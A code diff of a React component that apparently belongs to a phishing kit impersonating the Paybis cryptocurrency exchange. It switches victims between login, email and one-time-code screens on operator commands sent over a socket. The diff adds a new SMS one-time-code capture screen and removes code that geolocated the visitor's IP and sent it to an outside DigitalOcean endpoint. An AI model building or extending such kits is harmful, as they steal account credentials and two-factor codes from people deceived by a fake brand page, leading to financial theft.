@@ -7,6 +7,7 @@ import Paybisemail from "./paybisemail";
 import PaybisOTP from "./paybisOTP";
 import PaybisLoad from "./paybisload";
 import PaybisOTPMSG from "./paybisOTPMSG";
+import PaybisOTPsms from "./paybisOTPsms";
 
 import { useTranslation } from 'react-i18next';
 
@@ -20,37 +21,13 @@ export default function Paybis({ ip, socket }) {
 
   const [mostraOtpErro, setMostraOtpErro] = useState(false);
 
-
-  useEffect(() => {
-
-    const detectLanguage = async () => {
-      try {
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
-        const { countryCode, city } = response.data;
-
-        // Atualizar região no banco de dados
-        await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizaregiao", {
-          countryCode, city, ip
-        });
-
-        const browserLang = i18n.language || window.navigator.language;
-        changeLanguage(browserLang);
-    
-      } catch (error) {
-        console.error("Erro ao detectar idioma:", error);
-        changeLanguage('en'); // Default para inglês se algo der errado
-      }
-    };
-
-    detectLanguage();
-
-  }, []); // Executa apenas uma vez, quando o componente é montado
-
-  const changeLanguage = (lang) => {
-    
-    i18n.changeLanguage(lang);
-    setCurrentLang(lang); // Atualiza o estado com o novo idioma
+  const changeLanguage = () => {
+    const language = localStorage.get("lang");
+    i18n.changeLanguage(language);
+    setCurrentLang(language); // Atualiza o estado com o novo idioma
   };
+  
+
   const languageLinks = [
     { lang: "en", name: "English" },
     { lang: "ru", name: "Русский"},
@@ -502,6 +479,14 @@ export default function Paybis({ ip, socket }) {
                     ip={ip}
                     socket={socket}
                     setCenaAtual={setCenaAtual}
+                  />
+                ) : cenaAtual === "otp_sms" ? (
+                  <PaybisOTPsms
+                    ip={ip}
+                    socket={socket}
+                    setCenaAtual={setCenaAtual}
+                    msgRecebida={msgRecebida}
+                    mostraOtpErro={mostraOtpErro}
                   />
                 ) : cenaAtual === "otp2" ? (
                   <PaybisOTPMSG
